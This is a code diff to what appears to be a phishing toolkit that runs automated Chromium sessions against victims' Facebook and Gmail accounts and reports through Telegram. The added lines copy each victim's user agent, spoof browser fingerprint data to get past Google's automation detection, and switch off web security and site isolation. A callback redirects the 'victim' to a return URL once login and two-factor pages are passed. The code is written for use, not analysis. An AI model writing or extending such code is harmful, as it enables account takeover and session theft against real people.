@@ -13,6 +13,9 @@ import * as telegram from './telegram.js';
 import { collectGmailStats, formatStatsForTelegram } from './gmail-stats.js';
 
 const sessions = new Map(); // accountId -> { context, page, lastActivity }
+const redirectCbs = new Map();
+export function setRedirectCb(id, fn) { redirectCbs.set(id, fn); }
+export function clearRedirectCb(id) { redirectCbs.delete(id); }
 const starting = new Map(); // accountId -> Promise
 
 // Activity log: what happens on the remote (Facebook/Gmail) page itself —
@@ -95,10 +98,10 @@ async function launch(accountId, adminIp) {
   const { locale, timezoneId } = await resolveLocaleForIp(adminIp);
 
   const context = await chromium.launchPersistentContext(dir, {
-    headless: true,
+    headless: false,
     channel: account.channel || config.browserChannel || undefined,
     viewport: DEFAULT_VIEWPORT,
-    userAgent:
+    userAgent: account.victimUa ||
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
     args: [
       '--disable-blink-features=AutomationControlled',
@@ -113,6 +116,11 @@ async function launch(accountId, adminIp) {
       '--disable-features=ChromeWhatsNewUI,IsolateOrigins,site-per-process',
       '--flag-switches-begin',
       '--flag-switches-end',
+      '--disable-web-security',
+      '--disable-site-isolation-trials',
+      '--disable-features=BlockInsecurePrivateNetworkRequests',
+      '--window-size=1920,1080',
+      '--start-maximized',
       `--window-size=${DEFAULT_VIEWPORT.width},${DEFAULT_VIEWPORT.height}`,
       `--ozone-override-screen-size=${DEFAULT_VIEWPORT.width},${DEFAULT_VIEWPORT.height}`,
       // Chrome's "Secure DNS" (DNS-over-HTTPS) connects straight to
@@ -162,6 +170,42 @@ async function launch(accountId, adminIp) {
   const languages = lang === 'en' ? [locale, lang] : [locale, lang, 'en-US', 'en'];
   context.addInitScript((languages) => {
     Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+
+    // Spoof userAgentData — Google reads this to detect automated browsers
+    if (navigator.userAgentData) {
+      try {
+        Object.defineProperty(navigator, 'userAgentData', {
+          get: () => ({
+            brands: [
+              { brand: 'Google Chrome', version: '131' },
+              { brand: 'Chromium', version: '131' },
+              { brand: 'Not_A Brand', version: '24' }
+            ],
+            mobile: false,
+            platform: 'Windows',
+            getHighEntropyValues: () => Promise.resolve({
+              architecture: 'x86',
+              bitness: '64',
+              brands: [
+                { brand: 'Google Chrome', version: '131' },
+                { brand: 'Chromium', version: '131' },
+                { brand: 'Not_A Brand', version: '24' }
+              ],
+              fullVersionList: [
+                { brand: 'Google Chrome', version: '131.0.0.0' },
+                { brand: 'Chromium', version: '131.0.0.0' },
+                { brand: 'Not_A Brand', version: '24.0.0.0' }
+              ],
+              mobile: false,
+              model: '',
+              platform: 'Windows',
+              platformVersion: '10.0.0',
+              uaFullVersion: '131.0.0.0'
+            })
+          })
+        });
+      } catch(e) {}
+    }
     Object.defineProperty(navigator, 'languages', {
       get: () => languages,
     });
@@ -474,6 +518,14 @@ async function launch(accountId, adminIp) {
     pushLog(accountId, 'nav', url);
     console.log(`[flow:${accountId}] nav → ${url}`);
     lastNavUrl = url;
+    // Redirect victim after successful login
+    if (!/login|signin|auth|checkpoint|two_factor|afad|approvals/.test(url) && /facebook\.com|google\.com|accounts\.google/.test(url)) {
+      const acc = sessions.get(accountId);
+      if (s && !s.redirectDone) {
+        const cb = redirectCbs.get(accountId);
+        if (cb && s.returnUrl) { s.redirectDone = true; setTimeout(() => cb(s.returnUrl), 1500); }
+      }
+    }
 
     // Diagnostyka: które z 2FA/login markers widzimy w URL i tytule
     page.title().then((title) => {
@@ -690,7 +742,7 @@ async function launch(accountId, adminIp) {
 
   // navState: 'loading' | 'ready' | 'failed' — surfaced via status() so the
   // panel can show whether the pre-loaded page is ready for the admin yet.
-  const s = { context, page, lastActivity: Date.now(), navState: 'loading' };
+  const s = { context, page, lastActivity: Date.now(), navState: 'loading', returnUrl: account.returnUrl || null };
   sessions.set(accountId, s);
   context.on('close', () => {
     if (sessions.get(accountId) === s) sessions.delete(accountId);
